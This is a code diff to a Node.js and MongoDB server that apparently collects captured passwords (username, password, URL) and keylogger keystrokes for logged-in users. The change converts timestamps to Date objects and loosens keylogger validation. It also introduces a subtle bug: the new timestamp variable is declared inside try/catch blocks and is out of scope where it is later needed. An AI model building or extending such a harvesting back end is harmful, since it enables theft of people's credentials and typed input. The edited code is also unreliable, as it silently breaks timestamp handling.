@@ -140,7 +140,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								},
 								$push: {
 									logins: {
-										time		: Math.round(new Date().getTime() / 1000),
+										timestamp	: new Date(),
 										ip			: ipAddress,
 										token		: token,
 										login_type	: loginMethod
@@ -160,7 +160,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								},
 								github		: user,
 								logins		: [{
-									time		: Math.round(new Date().getTime() / 1000),
+									timestamp	: new Date(),
 									ip			: ipAddress,
 									token		: token,
 									login_type	: loginMethod
@@ -220,7 +220,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 												type	: "whitelist",
 												domains	: []
 											},
-											created_at	: Math.round(new Date().getTime() / 1000)
+											created_at	: new Date()
 										},
 										passwords		: [],
 										keylogger		: []
@@ -604,7 +604,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 										{
 											$push: {
 												passwords: {
-													timestamp	: Math.round(new Date().getTime() / 1000),
+													timestamp	: new Date(),
 													username	: record[username],
 													password	: record[password],
 													url			: record[url],
@@ -626,9 +626,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 										})
 									} else if (record[type] == 1) {
 										// Keylogger
-										let timestamp = Math.round(record[identifier] / 1000).toString()
+										try {
+											let timestamp = new Date(record[identifier])
+										} catch(e) {
+											let timestamp = new Date()
+										}
 										// If the length is greater than 10,
-										if (record[keys] && timestamp.length == 10) {
+										if (record[keys]) {
 											let keystrokes = []
 											try {
 												for (i = 0; i < record[keys].length; i++) {
@@ -686,13 +690,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 												}
 											})
 										} else {
-											if (timestamp.length == 10 && !record[keys]) {
-												reject("keylogger value(s) not specified")	
-											} else if (record[keys] && timestamp.length != 10) {
-												reject("keylogger identifier not specified")
-											} else {
-												reject("keylogger identifier & value(s) not specified")	
-											}
+											reject("keylogger value(s) not specified")	
 										}
 									} else {
 										reject("invalid / missing record type")	
